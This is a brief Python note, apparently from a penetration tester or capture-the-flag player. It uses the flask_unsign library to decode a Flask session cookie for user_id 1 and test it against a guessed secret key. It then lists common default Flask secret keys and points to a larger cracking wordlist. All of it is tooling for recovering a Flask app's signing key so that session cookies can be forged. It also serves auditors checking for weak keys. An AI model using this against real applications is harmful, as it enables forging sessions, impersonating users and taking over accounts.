from flask_unsign import session
session_cookie="eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEfQPg.Enz83rUqMAFfdCds7ClQzlEmScg"; #user_id:1 
session.decode(session_cookie)
session.verify(session_cookie, '\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h')

#### DEFAULT KEYS ####

# CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
# thisISaSECRET_1234
# YOUR_OWN_RANDOM_GENERATED_SECRET_KEY
# TEST_NON_DEV_SECRET


# More complete word list
# https://github.com/Paradoxis/Flask-Unsign-Wordlist
